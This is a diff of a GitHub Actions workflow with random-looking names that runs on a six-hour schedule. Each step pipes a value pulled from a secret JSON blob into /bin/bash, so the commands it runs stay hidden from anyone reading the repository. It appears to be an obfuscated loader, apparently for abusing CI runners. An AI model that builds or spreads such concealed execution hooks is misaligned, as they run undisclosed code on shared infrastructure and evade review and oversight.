@@ -1,29 +1,26 @@
 name: heinzclown
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 4/6 * * *'
-
-jobs:  # 10196
+    - cron: '41 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: heinzclown
         env:
-          u95: ${{ secrets.u95 }}
+          p0538: ${{ secrets.p0538 }}
         run: |
-          echo $u95 | jq -r .ejrlc5 | /bin/bash
-          echo $gmp39 | jq -r .tmco47046 | /bin/bash
-          echo $cp8 | jq -r .jfxsd1 | /bin/bash
-          echo $iquzy0838 | jq -r .rf88630 | /bin/bash
-          echo $jwvbi60 | jq -r .wfgjx078 | /bin/bash
-          echo $pkag0570 | jq -r .a8515 | /bin/bash
-          echo $nipmt493 | jq -r .xqxtx05925 | /bin/bash
-          echo $tqh1853 | jq -r .tl16 | /bin/bash
-          echo $sv5251 | jq -r .jrsbr63560 | /bin/bash
-          echo $wr356 | jq -r .rhyu2 | /bin/bash
-          echo $l69 | jq -r .vc2099 | /bin/bash
-          echo $zw30 | jq -r .rps1359 | /bin/bash
-          echo $vsks5901 | jq -r .dect3 | /bin/bash
+          echo $p0538 | jq -r .q4569 | /bin/bash
+          echo $pbma91974 | jq -r .yyavq9 | /bin/bash
+          echo $y04 | jq -r .qc2683 | /bin/bash
+          echo $djm4 | jq -r .av848 | /bin/bash
+          echo $ebkwx45 | jq -r .th6 | /bin/bash
+          echo $cugr3229 | jq -r .ywvvz533 | /bin/bash
+          echo $gv3218 | jq -r .dq5281 | /bin/bash
+          echo $eshu9 | jq -r .n854 | /bin/bash
+          echo $be734 | jq -r .j2 | /bin/bash
 
